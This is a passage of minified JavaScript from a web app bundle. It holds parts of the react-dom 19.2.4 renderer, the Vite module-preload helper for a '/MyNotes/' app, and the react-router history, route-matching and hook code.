Promise(function(e,t){o.onload=e,o.onerror=t}),Bd(a,`link`,r),n.instance=a}e.stylesheets===null&&(e.stylesheets=new Map),e.stylesheets.set(n,t),(t=n.state.preload)&&!(n.state.loading&3)&&(e.count++,n=ep.bind(e),t.addEventListener(`load`,n),t.addEventListener(`error`,n))}}var Qf=0;function $f(e,t){return e.stylesheets&&e.count===0&&np(e,e.stylesheets),0<e.count||0<e.imgCount?function(n){var r=setTimeout(function(){if(e.stylesheets&&np(e,e.stylesheets),e.unsuspend){var t=e.unsuspend;e.unsuspend=null,t()}},6e4+t);0<e.imgBytes&&Qf===0&&(Qf=62500*Ud());var i=setTimeout(function(){if(e.waitingForImages=!1,e.count===0&&(e.stylesheets&&np(e,e.stylesheets),e.unsuspend)){var t=e.unsuspend;e.unsuspend=null,t()}},(e.imgBytes>Qf?50:800)+t);return e.unsuspend=n,function(){e.unsuspend=null,clearTimeout(r),clearTimeout(i)}}:null}function ep(){if(this.count--,this.count===0&&(this.imgCount===0||!this.waitingForImages)){if(this.stylesheets)np(this,this.stylesheets);else if(this.unsuspend){var e=this.unsuspend;this.unsuspend=null,e()}}}var tp=null;function np(e,t){e.stylesheets=null,e.unsuspend!==null&&(e.count++,tp=new Map,t.forEach(rp,e),tp=null,ep.call(e))}function rp(e,t){if(!(t.state.loading&4)){var n=tp.get(e);if(n)var r=n.get(null);else{n=new Map,tp.set(e,n);for(var i=e.querySelectorAll(`link[data-precedence],style[data-precedence]`),a=0;a<i.length;a++){var o=i[a];(o.nodeName===`LINK`||o.getAttribute(`media`)!==`not all`)&&(n.set(o.dataset.precedence,o),r=o)}r&&n.set(null,r)}i=t.instance,o=i.getAttribute(`data-precedence`),a=n.get(o)||r,a===r&&n.set(null,i),n.set(o,i),this.count++,r=ep.bind(this),i.addEventListener(`load`,r),i.addEventListener(`error`,r),a?a.parentNode.insertBefore(i,a.nextSibling):(e=e.nodeType===9?e.head:e,e.insertBefore(i,e.firstChild)),t.state.loading|=4}}var ip={$$typeof:C,Provider:null,Consumer:null,_currentValue:se,_currentValue2:se,_threadCount:0};function ap(e,t,n,r,i,a,o,s,c){this.tag=1,this.containerInfo=e,this.pingCache=this.current=this.pendingChildren=null,this.timeoutHandle=-1,this.callbackNode=this.next=this.pendingContext=this.context=this.cancelPendingCommit=null,this.callbackPriority=0,this.expirationTimes=rt(-1),this.entangledLanes=this.shellSuspendCounter=this.errorRecoveryDisabledLanes=this.expiredLanes=this.warmLanes=this.pingedLanes=this.suspendedLanes=this.pendingLanes=0,this.entanglements=rt(0),this.hiddenUpdates=rt(null),this.identifierPrefix=r,this.onUncaughtError=i,this.onCaughtError=a,this.onRecoverableError=o,this.pooledCache=null,this.pooledCacheLanes=0,this.formState=c,this.incompleteTransitions=new Map}function op(e,t,n,r,i,a,o,s,c,l,u,d){return e=new ap(e,t,n,o,c,l,u,d,s),t=1,!0===a&&(t|=24),a=M(3,null,null,t),e.current=a,a.stateNode=e,t=da(),t.refCount++,e.pooledCache=t,t.refCount++,a.memoizedState={element:r,isDehydrated:n,cache:t},Wa(a),e}function sp(e){return e?(e=pi,e):pi}function cp(e,t,n,r,i,a){i=sp(i),r.context===null?r.context=i:r.pendingContext=i,r=Ka(t),r.payload={element:n},a=a===void 0?null:a,a!==null&&(r.callback=a),n=qa(e,r,t),n!==null&&(Su(n,e,t),Ja(n,e,t))}function lp(e,t){if(e=e.memoizedState,e!==null&&e.dehydrated!==null){var n=e.retryLane;e.retryLane=n!==0&&n<t?n:t}}function up(e,t){lp(e,t),(e=e.alternate)&&lp(e,t)}function dp(e){if(e.tag===13||e.tag===31){var t=ui(e,67108864);t!==null&&Su(t,e,67108864),up(e,67108864)}}function fp(e){if(e.tag===13||e.tag===31){var t=bu();t=lt(t);var n=ui(e,t);n!==null&&Su(n,e,t),up(e,t)}}var pp=!0;function mp(e,t,n,r){var i=k.T;k.T=null;var a=A.p;try{A.p=2,gp(e,t,n,r)}finally{A.p=a,k.T=i}}function hp(e,t,n,r){var i=k.T;k.T=null;var a=A.p;try{A.p=8,gp(e,t,n,r)}finally{A.p=a,k.T=i}}function gp(e,t,n,r){if(pp){var i=_p(r);if(i===null)Ad(e,t,r,vp,n),J(e,r);else if(Ap(i,e,t,n,r))r.stopPropagation();else if(J(e,r),t&4&&-1<Op.indexOf(e)){for(;i!==null;){var a=wt(i);if(a!==null)switch(a.tag){case 3:if(a=a.stateNode,a.current.memoizedState.isDehydrated){var o=Qe(a.pendingLanes);if(o!==0){var s=a;for(s.pendingLanes|=2,s.entangledLanes|=2;o;){var c=1<<31-Ge(o);s.entanglements[1]|=c,o&=~c}ud(a),!(z&6)&&(cu=Ne()+500,dd(0,!1))}}break;case 31:case 13:s=ui(a,2),s!==null&&Su(s,a,2),Du(),up(a,2)}if(a=_p(r),a===null&&Ad(e,t,r,vp,n),a===i)break;i=a}i!==null&&r.stopPropagation()}else Ad(e,t,r,null,n)}}function _p(e){return e=un(e),yp(e)}var vp=null;function yp(e){if(vp=null,e=Ct(e),e!==null){var t=o(e);if(t===null)e=null;else{var n=t.tag;if(n===13){if(e=s(t),e!==null)return e;e=null}else if(n===31){if(e=c(t),e!==null)return e;e=null}else if(n===3){if(t.stateNode.current.memoizedState.isDehydrated)return t.tag===3?t.stateNode.containerInfo:null;e=null}else t!==e&&(e=null)}}return vp=e,null}function bp(e){switch(e){case`beforetoggle`:case`cancel`:case`click`:case`close`:case`contextmenu`:case`copy`:case`cut`:case`auxclick`:case`dblclick`:case`dragend`:case`dragstart`:case`drop`:case`focusin`:case`focusout`:case`input`:case`invalid`:case`keydown`:case`keypress`:case`keyup`:case`mousedown`:case`mouseup`:case`paste`:case`pause`:case`play`:case`pointercancel`:case`pointerdown`:case`pointerup`:case`ratechange`:case`reset`:case`resize`:case`seeked`:case`submit`:case`toggle`:case`touchcancel`:case`touchend`:case`touchstart`:case`volumechange`:case`change`:case`selectionchange`:case`textInput`:case`compositionstart`:case`compositionend`:case`compositionupdate`:case`beforeblur`:case`afterblur`:case`beforeinput`:case`blur`:case`fullscreenchange`:case`focus`:case`hashchange`:case`popstate`:case`select`:case`selectstart`:return 2;case`drag`:case`dragenter`:case`dragexit`:case`dragleave`:case`dragover`:case`mousemove`:case`mouseout`:case`mouseover`:case`pointermove`:case`pointerout`:case`pointerover`:case`scroll`:case`touchmove`:case`wheel`:case`mouseenter`:case`mouseleave`:case`pointerenter`:case`pointerleave`:return 8;case`message`:switch(Pe()){case Fe:return 2;case Ie:return 8;case Le:case Re:return 32;case ze:return 268435456;default:return 32}default:return 32}}var xp=!1,Sp=null,Cp=null,wp=null,Tp=new Map,Ep=new Map,Dp=[],Op=`mousedown mouseup touchcancel touchend touchstart auxclick dblclick pointercancel pointerdown pointerup dragend dragstart drop compositionend compositionstart keydown keypress keyup input textInput copy cut paste click change contextmenu reset`.split(` `);function J(e,t){switch(e){case`focusin`:case`focusout`:Sp=null;break;case`dragenter`:case`dragleave`:Cp=null;break;case`mouseover`:case`mouseout`:wp=null;break;case`pointerover`:case`pointerout`:Tp.delete(t.pointerId);break;case`gotpointercapture`:case`lostpointercapture`:Ep.delete(t.pointerId)}}function kp(e,t,n,r,i,a){return e===null||e.nativeEvent!==a?(e={blockedOn:t,domEventName:n,eventSystemFlags:r,nativeEvent:a,targetContainers:[i]},t!==null&&(t=wt(t),t!==null&&dp(t)),e):(e.eventSystemFlags|=r,t=e.targetContainers,i!==null&&t.indexOf(i)===-1&&t.push(i),e)}function Ap(e,t,n,r,i){switch(t){case`focusin`:return Sp=kp(Sp,e,t,n,r,i),!0;case`dragenter`:return Cp=kp(Cp,e,t,n,r,i),!0;case`mouseover`:return wp=kp(wp,e,t,n,r,i),!0;case`pointerover`:var a=i.pointerId;return Tp.set(a,kp(Tp.get(a)||null,e,t,n,r,i)),!0;case`gotpointercapture`:return a=i.pointerId,Ep.set(a,kp(Ep.get(a)||null,e,t,n,r,i)),!0}return!1}function jp(e){var t=Ct(e.target);if(t!==null){var n=o(t);if(n!==null){if(t=n.tag,t===13){if(t=s(n),t!==null){e.blockedOn=t,ft(e.priority,function(){fp(n)});return}}else if(t===31){if(t=c(n),t!==null){e.blockedOn=t,ft(e.priority,function(){fp(n)});return}}else if(t===3&&n.stateNode.current.memoizedState.isDehydrated){e.blockedOn=n.tag===3?n.stateNode.containerInfo:null;return}}}e.blockedOn=null}function Mp(e){if(e.blockedOn!==null)return!1;for(var t=e.targetContainers;0<t.length;){var n=_p(e.nativeEvent);if(n===null){n=e.nativeEvent;var r=new n.constructor(n.type,n);ln=r,n.target.dispatchEvent(r),ln=null}else return t=wt(n),t!==null&&dp(t),e.blockedOn=n,!1;t.shift()}return!0}function Np(e,t,n){Mp(e)&&n.delete(t)}function Pp(){xp=!1,Sp!==null&&Mp(Sp)&&(Sp=null),Cp!==null&&Mp(Cp)&&(Cp=null),wp!==null&&Mp(wp)&&(wp=null),Tp.forEach(Np),Ep.forEach(Np)}function Fp(e,n){e.blockedOn===n&&(e.blockedOn=null,xp||(xp=!0,t.unstable_scheduleCallback(t.unstable_NormalPriority,Pp)))}var Ip=null;function Lp(e){Ip!==e&&(Ip=e,t.unstable_scheduleCallback(t.unstable_NormalPriority,function(){Ip===e&&(Ip=null);for(var t=0;t<e.length;t+=3){var n=e[t],r=e[t+1],i=e[t+2];if(typeof r!=`function`){if(yp(r||n)===null)continue;break}var a=wt(n);a!==null&&(e.splice(t,3),t-=3,ks(a,{pending:!0,data:i,method:n.method,action:r},r,i))}}))}function Rp(e){function t(t){return Fp(t,e)}Sp!==null&&Fp(Sp,e),Cp!==null&&Fp(Cp,e),wp!==null&&Fp(wp,e),Tp.forEach(t),Ep.forEach(t);for(var n=0;n<Dp.length;n++){var r=Dp[n];r.blockedOn===e&&(r.blockedOn=null)}for(;0<Dp.length&&(n=Dp[0],n.blockedOn===null);)jp(n),n.blockedOn===null&&Dp.shift();if(n=(e.ownerDocument||e).$$reactFormReplay,n!=null)for(r=0;r<n.length;r+=3){var i=n[r],a=n[r+1],o=i[ht]||null;if(typeof a==`function`)o||Lp(n);else if(o){var s=null;if(a&&a.hasAttribute(`formAction`)){if(i=a,o=a[ht]||null)s=o.formAction;else if(yp(i)!==null)continue}else s=o.action;typeof s==`function`?n[r+1]=s:(n.splice(r,3),r-=3),Lp(n)}}}function zp(){function e(e){e.canIntercept&&e.info===`react-transition`&&e.intercept({handler:function(){return new Promise(function(e){return i=e})},focusReset:`manual`,scroll:`manual`})}function t(){i!==null&&(i(),i=null),r||setTimeout(n,20)}function n(){if(!r&&!navigation.transition){var e=navigation.currentEntry;e&&e.url!=null&&navigation.navigate(e.url,{state:e.getState(),info:`react-transition`,history:`replace`})}}if(typeof navigation==`object`){var r=!1,i=null;return navigation.addEventListener(`navigate`,e),navigation.addEventListener(`navigatesuccess`,t),navigation.addEventListener(`navigateerror`,t),setTimeout(n,100),function(){r=!0,navigation.removeEventListener(`navigate`,e),navigation.removeEventListener(`navigatesuccess`,t),navigation.removeEventListener(`navigateerror`,t),i!==null&&(i(),i=null)}}}function Bp(e){this._internalRoot=e}Vp.prototype.render=Bp.prototype.render=function(e){var t=this._internalRoot;if(t===null)throw Error(i(409));var n=t.current;cp(n,bu(),e,t,null,null)},Vp.prototype.unmount=Bp.prototype.unmount=function(){var e=this._internalRoot;if(e!==null){this._internalRoot=null;var t=e.containerInfo;cp(e.current,2,null,e,null,null),Du(),t[gt]=null}};function Vp(e){this._internalRoot=e}Vp.prototype.unstable_scheduleHydration=function(e){if(e){var t=dt();e={blockedOn:null,target:e,priority:t};for(var n=0;n<Dp.length&&t!==0&&t<Dp[n].priority;n++);Dp.splice(n,0,e),n===0&&jp(e)}};var Hp=n.version;if(Hp!==`19.2.4`)throw Error(i(527,Hp,`19.2.4`));A.findDOMNode=function(e){var t=e._reactInternals;if(t===void 0)throw typeof e.render==`function`?Error(i(188)):(e=Object.keys(e).join(`,`),Error(i(268,e)));return e=u(t),e=e===null?null:d(e),e=e===null?null:e.stateNode,e};var Up={bundleType:0,version:`19.2.4`,rendererPackageName:`react-dom`,currentDispatcherRef:k,reconcilerVersion:`19.2.4`};if(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__<`u`){var Wp=__REACT_DEVTOOLS_GLOBAL_HOOK__;if(!Wp.isDisabled&&Wp.supportsFiber)try{He=Wp.inject(Up),Ue=Wp}catch{}}e.createRoot=function(e,t){if(!a(e))throw Error(i(299));var n=!1,r=``,o=Qs,s=$s,c=ec;return t!=null&&(!0===t.unstable_strictMode&&(n=!0),t.identifierPrefix!==void 0&&(r=t.identifierPrefix),t.onUncaughtError!==void 0&&(o=t.onUncaughtError),t.onCaughtError!==void 0&&(s=t.onCaughtError),t.onRecoverableError!==void 0&&(c=t.onRecoverableError)),t=op(e,1,!1,null,null,n,r,null,o,s,c,zp),e[gt]=t.current,Od(e),new Bp(t)}})),y=s(((e,t)=>{function n(){if(!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__>`u`||typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE!=`function`))try{__REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(n)}catch(e){console.error(e)}}n(),t.exports=v()})),b=`modulepreload`,x=function(e){return`/MyNotes/`+e},S={},C=function(e,t,n){let r=Promise.resolve();if(t&&t.length>0){let e=document.getElementsByTagName(`link`),i=document.querySelector(`meta[property=csp-nonce]`),a=i?.nonce||i?.getAttribute(`nonce`);function o(e){return Promise.all(e.map(e=>Promise.resolve(e).then(e=>({status:`fulfilled`,value:e}),e=>({status:`rejected`,reason:e}))))}r=o(t.map(t=>{if(t=x(t,n),t in S)return;S[t]=!0;let r=t.endsWith(`.css`),i=r?`[rel="stylesheet"]`:``;if(n)for(let n=e.length-1;n>=0;n--){let i=e[n];if(i.href===t&&(!r||i.rel===`stylesheet`))return}else if(document.querySelector(`link[href="${t}"]${i}`))return;let o=document.createElement(`link`);if(o.rel=r?`stylesheet`:b,r||(o.as=`script`),o.crossOrigin=``,o.href=t,a&&o.setAttribute(`nonce`,a),document.head.appendChild(o),r)return new Promise((e,n)=>{o.addEventListener(`load`,e),o.addEventListener(`error`,()=>n(Error(`Unable to preload CSS for ${t}`)))})}))}function i(e){let t=new Event(`vite:preloadError`,{cancelable:!0});if(t.payload=e,window.dispatchEvent(t),!t.defaultPrevented)throw e}return r.then(t=>{for(let e of t||[])e.status===`rejected`&&i(e.reason);return e().catch(i)})},w=u(p(),1),T=`popstate`;function E(e){return typeof e==`object`&&!!e&&`pathname`in e&&`search`in e&&`hash`in e&&`state`in e&&`key`in e}function ee(e={}){function t(e,t){let{pathname:n=`/`,search:r=``,hash:i=``}=ae(e.location.hash.substring(1));return!n.startsWith(`/`)&&!n.startsWith(`.`)&&(n=`/`+n),re(``,{pathname:n,search:r,hash:i},t.state&&t.state.usr||null,t.state&&t.state.key||`default`)}function n(e,t){let n=e.document.querySelector(`base`),r=``;if(n&&n.getAttribute(`href`)){let t=e.location.href,n=t.indexOf(`#`);r=n===-1?t:t.slice(0,n)}return r+`#`+(typeof t==`string`?t:ie(t))}function r(e,t){O(e.pathname.charAt(0)===`/`,`relative pathnames are not supported in hash history.push(${JSON.stringify(t)})`)}return oe(t,n,r,e)}function D(e,t){if(e===!1||e==null)throw Error(t)}function O(e,t){if(!e){typeof console<`u`&&console.warn(t);try{throw Error(t)}catch{}}}function te(){return Math.random().toString(36).substring(2,10)}function ne(e,t){return{usr:e.state,key:e.key,idx:t,masked:e.unstable_mask?{pathname:e.pathname,search:e.search,hash:e.hash}:void 0}}function re(e,t,n=null,r,i){return{pathname:typeof e==`string`?e:e.pathname,search:``,hash:``,...typeof t==`string`?ae(t):t,state:n,key:t&&t.key||r||te(),unstable_mask:i}}function ie({pathname:e=`/`,search:t=``,hash:n=``}){return t&&t!==`?`&&(e+=t.charAt(0)===`?`?t:`?`+t),n&&n!==`#`&&(e+=n.charAt(0)===`#`?n:`#`+n),e}function ae(e){let t={};if(e){let n=e.indexOf(`#`);n>=0&&(t.hash=e.substring(n),e=e.substring(0,n));let r=e.indexOf(`?`);r>=0&&(t.search=e.substring(r),e=e.substring(0,r)),e&&(t.pathname=e)}return t}function oe(e,t,n,r={}){let{window:i=document.defaultView,v5Compat:a=!1}=r,o=i.history,s=`POP`,c=null,l=u();l??(l=0,o.replaceState({...o.state,idx:l},``));function u(){return(o.state||{idx:null}).idx}function d(){s=`POP`;let e=u(),t=e==null?null:e-l;l=e,c&&c({action:s,location:h.location,delta:t})}function f(e,t){s=`PUSH`;let r=E(e)?e:re(h.location,e,t);n&&n(r,e),l=u()+1;let d=ne(r,l),f=h.createHref(r.unstable_mask||r);try{o.pushState(d,``,f)}catch(e){if(e instanceof DOMException&&e.name===`DataCloneError`)throw e;i.location.assign(f)}a&&c&&c({action:s,location:h.location,delta:1})}function p(e,t){s=`REPLACE`;let r=E(e)?e:re(h.location,e,t);n&&n(r,e),l=u();let i=ne(r,l),d=h.createHref(r.unstable_mask||r);o.replaceState(i,``,d),a&&c&&c({action:s,location:h.location,delta:0})}function m(e){return k(e)}let h={get action(){return s},get location(){return e(i,o)},listen(e){if(c)throw Error(`A history only accepts one active listener`);return i.addEventListener(T,d),c=e,()=>{i.removeEventListener(T,d),c=null}},createHref(e){return t(i,e)},createURL:m,encodeLocation(e){let t=m(e);return{pathname:t.pathname,search:t.search,hash:t.hash}},push:f,replace:p,go(e){return o.go(e)}};return h}function k(e,t=!1){let n=`http://localhost`;typeof window<`u`&&(n=window.location.origin===`null`?window.location.href:window.location.origin),D(n,`No window.location.(origin|href) available to create URL`);let r=typeof e==`string`?e:ie(e);return r=r.replace(/ $/,`%20`),!t&&r.startsWith(`//`)&&(r=n+r),new URL(r,n)}function A(e,t,n=`/`){return se(e,t,n,!1)}function se(e,t,n,r){let i=Te((typeof t==`string`?ae(t):t).pathname||`/`,n);if(i==null)return null;let a=le(e);de(a);let o=null;for(let e=0;o==null&&e<a.length;++e){let t=we(i);o=xe(a[e],t,r)}return o}function ce(e,t){let{route:n,pathname:r,params:i}=e;return{id:n.id,pathname:r,params:i,data:t[n.id],loaderData:t[n.id],handle:n.handle}}function le(e,t=[],n=[],r=``,i=!1){let a=(e,a,o=i,s)=>{let c={relativePath:s===void 0?e.path||``:s,caseSensitive:e.caseSensitive===!0,childrenIndex:a,route:e};if(c.relativePath.startsWith(`/`)){if(!c.relativePath.startsWith(r)&&o)return;D(c.relativePath.startsWith(r),`Absolute route path "${c.relativePath}" nested under path "${r}" is not valid. An absolute child route path must start with the combined path of all its parent routes.`),c.relativePath=c.relativePath.slice(r.length)}let l=Ne([r,c.relativePath]),u=n.concat(c);e.children&&e.children.length>0&&(D(e.index!==!0,`Index routes must not have child routes. Please remove all child routes from route path "${l}".`),le(e.children,t,u,l,o)),!(e.path==null&&!e.index)&&t.push({path:l,score:ye(l,e.index),routesMeta:u})};return e.forEach((e,t)=>{if(e.path===``||!e.path?.includes(`?`))a(e,t);else for(let n of ue(e.path))a(e,t,!0,n)}),t}function ue(e){let t=e.split(`/`);if(t.length===0)return[];let[n,...r]=t,i=n.endsWith(`?`),a=n.replace(/\?$/,``);if(r.length===0)return i?[a,``]:[a];let o=ue(r.join(`/`)),s=[];return s.push(...o.map(e=>e===``?a:[a,e].join(`/`))),i&&s.push(...o),s.map(t=>e.startsWith(`/`)&&t===``?`/`:t)}function de(e){e.sort((e,t)=>e.score===t.score?be(e.routesMeta.map(e=>e.childrenIndex),t.routesMeta.map(e=>e.childrenIndex)):t.score-e.score)}var fe=/^:[\w-]+$/,pe=3,me=2,he=1,ge=10,_e=-2,ve=e=>e===`*`;function ye(e,t){let n=e.split(`/`),r=n.length;return n.some(ve)&&(r+=_e),t&&(r+=me),n.filter(e=>!ve(e)).reduce((e,t)=>e+(fe.test(t)?pe:t===``?he:ge),r)}function be(e,t){return e.length===t.length&&e.slice(0,-1).every((e,n)=>e===t[n])?e[e.length-1]-t[t.length-1]:0}function xe(e,t,n=!1){let{routesMeta:r}=e,i={},a=`/`,o=[];for(let e=0;e<r.length;++e){let s=r[e],c=e===r.length-1,l=a===`/`?t:t.slice(a.length)||`/`,u=Se({path:s.relativePath,caseSensitive:s.caseSensitive,end:c},l),d=s.route;if(!u&&c&&n&&!r[r.length-1].route.index&&(u=Se({path:s.relativePath,caseSensitive:s.caseSensitive,end:!1},l)),!u)return null;Object.assign(i,u.params),o.push({params:i,pathname:Ne([a,u.pathname]),pathnameBase:Pe(Ne([a,u.pathnameBase])),route:d}),u.pathnameBase!==`/`&&(a=Ne([a,u.pathnameBase]))}return o}function Se(e,t){typeof e==`string`&&(e={path:e,caseSensitive:!1,end:!0});let[n,r]=Ce(e.path,e.caseSensitive,e.end),i=t.match(n);if(!i)return null;let a=i[0],o=a.replace(/(.)\/+$/,`$1`),s=i.slice(1);return{params:r.reduce((e,{paramName:t,isOptional:n},r)=>{if(t===`*`){let e=s[r]||``;o=a.slice(0,a.length-e.length).replace(/(.)\/+$/,`$1`)}let i=s[r];return n&&!i?e[t]=void 0:e[t]=(i||``).replace(/%2F/g,`/`),e},{}),pathname:a,pathnameBase:o,pattern:e}}function Ce(e,t=!1,n=!0){O(e===`*`||!e.endsWith(`*`)||e.endsWith(`/*`),`Route path "${e}" will be treated as if it were "${e.replace(/\*$/,`/*`)}" because the \`*\` character must always follow a \`/\` in the pattern. To get rid of this warning, please change the route path to "${e.replace(/\*$/,`/*`)}".`);let r=[],i=`^`+e.replace(/\/*\*?$/,``).replace(/^\/*/,`/`).replace(/[\\.*+^${}|()[\]]/g,`\\$&`).replace(/\/:([\w-]+)(\?)?/g,(e,t,n,i,a)=>{if(r.push({paramName:t,isOptional:n!=null}),n){let t=a.charAt(i+e.length);return t&&t!==`/`?`/([^\\/]*)`:`(?:/([^\\/]*))?`}return`/([^\\/]+)`}).replace(/\/([\w-]+)\?(\/|$)/g,`(/$1)?$2`);return e.endsWith(`*`)?(r.push({paramName:`*`}),i+=e===`*`||e===`/*`?`(.*)$`:`(?:\\/(.+)|\\/*)$`):n?i+=`\\/*$`:e!==``&&e!==`/`&&(i+=`(?:(?=\\/|$))`),[new RegExp(i,t?void 0:`i`),r]}function we(e){try{return e.split(`/`).map(e=>decodeURIComponent(e).replace(/\//g,`%2F`)).join(`/`)}catch(t){return O(!1,`The URL path "${e}" could not be decoded because it is a malformed URL segment. This is probably due to a bad percent encoding (${t}).`),e}}function Te(e,t){if(t===`/`)return e;if(!e.toLowerCase().startsWith(t.toLowerCase()))return null;let n=t.endsWith(`/`)?t.length-1:t.length,r=e.charAt(n);return r&&r!==`/`?null:e.slice(n)||`/`}var Ee=/^(?:[a-z][a-z0-9+.-]*:|\/\/)/i;function De(e,t=`/`){let{pathname:n,search:r=``,hash:i=``}=typeof e==`string`?ae(e):e,a;return n?(n=n.replace(/\/\/+/g,`/`),a=n.startsWith(`/`)?Oe(n.substring(1),`/`):Oe(n,t)):a=t,{pathname:a,search:Fe(r),hash:Ie(i)}}function Oe(e,t){let n=t.replace(/\/+$/,``).split(`/`);return e.split(`/`).forEach(e=>{e===`..`?n.length>1&&n.pop():e!==`.`&&n.push(e)}),n.length>1?n.join(`/`):`/`}function ke(e,t,n,r){return`Cannot include a '${e}' character in a manually specified \`to.${t}\` field [${JSON.stringify(r)}].  Please separate it out to the \`to.${n}\` field. Alternatively you may provide the full path as a string in <Link to="..."> and the router will parse it for you.`}function Ae(e){return e.filter((e,t)=>t===0||e.route.path&&e.route.path.length>0)}function je(e){let t=Ae(e);return t.map((e,n)=>n===t.length-1?e.pathname:e.pathnameBase)}function Me(e,t,n,r=!1){let i;typeof e==`string`?i=ae(e):(i={...e},D(!i.pathname||!i.pathname.includes(`?`),ke(`?`,`pathname`,`search`,i)),D(!i.pathname||!i.pathname.includes(`#`),ke(`#`,`pathname`,`hash`,i)),D(!i.search||!i.search.includes(`#`),ke(`#`,`search`,`hash`,i)));let a=e===``||i.pathname===``,o=a?`/`:i.pathname,s;if(o==null)s=n;else{let e=t.length-1;if(!r&&o.startsWith(`..`)){let t=o.split(`/`);for(;t[0]===`..`;)t.shift(),--e;i.pathname=t.join(`/`)}s=e>=0?t[e]:`/`}let c=De(i,s),l=o&&o!==`/`&&o.endsWith(`/`),u=(a||o===`.`)&&n.endsWith(`/`);return!c.pathname.endsWith(`/`)&&(l||u)&&(c.pathname+=`/`),c}var Ne=e=>e.join(`/`).replace(/\/\/+/g,`/`),Pe=e=>e.replace(/\/+$/,``).replace(/^\/*/,`/`),Fe=e=>!e||e===`?`?``:e.startsWith(`?`)?e:`?`+e,Ie=e=>!e||e===`#`?``:e.startsWith(`#`)?e:`#`+e,Le=class{constructor(e,t,n,r=!1){this.status=e,this.statusText=t||``,this.internal=r,n instanceof Error?(this.data=n.toString(),this.error=n):this.data=n}};function Re(e){return e!=null&&typeof e.status==`number`&&typeof e.statusText==`string`&&typeof e.internal==`boolean`&&`data`in e}function ze(e){return e.map(e=>e.route.path).filter(Boolean).join(`/`).replace(/\/\/*/g,`/`)||`/`}var Be=typeof window<`u`&&window.document!==void 0&&window.document.createElement!==void 0;function Ve(e,t){let n=e;if(typeof n!=`string`||!Ee.test(n))return{absoluteURL:void 0,isExternal:!1,to:n};let r=n,i=!1;if(Be)try{let e=new URL(window.location.href),r=n.startsWith(`//`)?new URL(e.protocol+n):new URL(n),a=Te(r.pathname,t);r.origin===e.origin&&a!=null?n=a+r.search+r.hash:i=!0}catch{O(!1,`<Link to="${n}"> contains an invalid URL which will probably break when clicked - please update to a valid URL path.`)}return{absoluteURL:r,isExternal:i,to:n}}Object.getOwnPropertyNames(Object.prototype).sort().join(`\0`);var He=w.createContext(null);He.displayName=`DataRouter`;var Ue=w.createContext(null);Ue.displayName=`DataRouterState`;var We=w.createContext(!1),Ge=w.createContext({isTransitioning:!1});Ge.displayName=`ViewTransition`;var Ke=w.createContext(new Map);Ke.displayName=`Fetchers`;var qe=w.createContext(null);qe.displayName=`Await`;var Je=w.createContext(null);Je.displayName=`Navigation`;var Ye=w.createContext(null);Ye.displayName=`Location`;var Xe=w.createContext({outlet:null,matches:[],isDataRoute:!1});Xe.displayName=`Route`;var Ze=w.createContext(null);Ze.displayName=`RouteError`;var Qe=`REACT_ROUTER_ERROR`,$e=`REDIRECT`,et=`ROUTE_ERROR_RESPONSE`;function tt(e){if(e.startsWith(`${Qe}:${$e}:{`))try{let t=JSON.parse(e.slice(28));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`&&typeof t.location==`string`&&typeof t.reloadDocument==`boolean`&&typeof t.replace==`boolean`)return t}catch{}}function nt(e){if(e.startsWith(`${Qe}:${et}:{`))try{let t=JSON.parse(e.slice(40));if(typeof t==`object`&&t&&typeof t.status==`number`&&typeof t.statusText==`string`)return new Le(t.status,t.statusText,t.data)}catch{}}function rt(e,{relative:t}={}){D(it(),`useHref() may be used only in the context of a <Router> component.`);let{basename:n,navigator:r}=w.useContext(Je),{hash:i,pathname:a,search:o}=ut(e,{relative:t}),s=a;return n!==`/`&&(s=a===`/`?n:Ne([n,a])),r.createHref({pathname:s,search:o,hash:i})}function it(){return w.useContext(Ye)!=null}function at(){return D(it(),`useLocation() may be used only in the context of a <Router> component.`),w.useContext(Ye).location}var ot=`You should call navigate() in a React.useEffect(), not when your component is first rendered.`;function st(e){w.useContext(Je).static||w.useLayoutEffect(e)}function ct(){let{isDataRoute:e}=w.useContext(Xe);return e?kt():lt()}function lt(){D(it(),`useNavigate() may be used only in the context of a <Router> component.`);let e=w.useContext(He),{basename:t,navigator:n}=w.useContext(Je),{matches:r}=w.useContext(Xe),{pathname:i}=at(),a=JSON.stringify(je(r)),o=w.useRef(!1);return st(()=>{o.current=!0}),w.useCallback((r,s={})=>{if(O(o.current,ot),!o.current)return;if(typeof r==`number`){n.go(r);return}let c=Me(r,JSON.parse(a),i,s.relative===`path`);e==null&&t!==`/`&&(c.pathname=c.pathname===`/`?t:Ne([t,c.pathname])),(s.replace?n.replace:n.push)(c,s.state,s)},[t,n,a,i,e])}w.createContext(null);function ut(e,{relative:t}={}){let{matches:n}=w.useContext(Xe),{pathname:r}=at(),i=JSON.stringify(je(n));return w.useMemo(()=>Me(e,JSON.parse(i),r,t===`path`),[e,i,r,t])}function dt(e,t){return ft(e,t)}function ft(e,t,n){D(it(),`useRoutes() may be used only in the context of a <Router> component.`);let{navigator:r}=w.useContext(Je),{matches:i}=w.useContext(Xe),a=i[i.length-1],o=a?a.params:{},s=a?a.pathname:`/`,c=a?a.pathnameBase:`/`,l=a&&a.route;{let e=l&&l.path||``;jt(s,!l||e.endsWith(`*`)||e.endsWith(`*?`),`You rendered descendant <Routes> (or called \`useRoutes()\`) at "${s}" (under <Route path="${e}">) but the parent route path has no trailing "*". This means if you navigate deeper, the parent won't match anymore and therefore the child routes will never render.

Please change the parent <Route path="${e}"> to <Route path="${e===`/`?`*`:`${e}/*`}">.`)}let u=at(),d;if(t){let e=typeof t==`string`?ae(t):t;D(c===`/`||e.pathname?.startsWith(c),`When overriding the location using \`<Routes location>\` or \`useRoutes(routes, location)\`, the location pathname must begin with the portion of the URL pathname that was matched by all parent routes. The current pathname base is "${c}" but pathname "${e.pathname}" was given in the \`location\` prop.`),d=e}else d=u;let f=d.pathname||`/`,p=f;if(c!==`/`){let e=c.replace(/^\//,``).split(`/`);p=`/`+f.replace(/^\//,``).split(`/`).slice(e.length).join(`/`)}let m=A(e,{pathname:p});O(l||m!=null,`No routes matched location "${d.pathname}${d.search}${d.hash}" `),O(m==null||m[m.length-1].route.element!==void 0||m[m.length-1].route.Component!==void 0||m[m.length-1].route.lazy!==void 0,`Matched leaf route at location "${d.pathname}${d.search}${d.hash}" does not have an element or Component. This means it will render an <Outlet 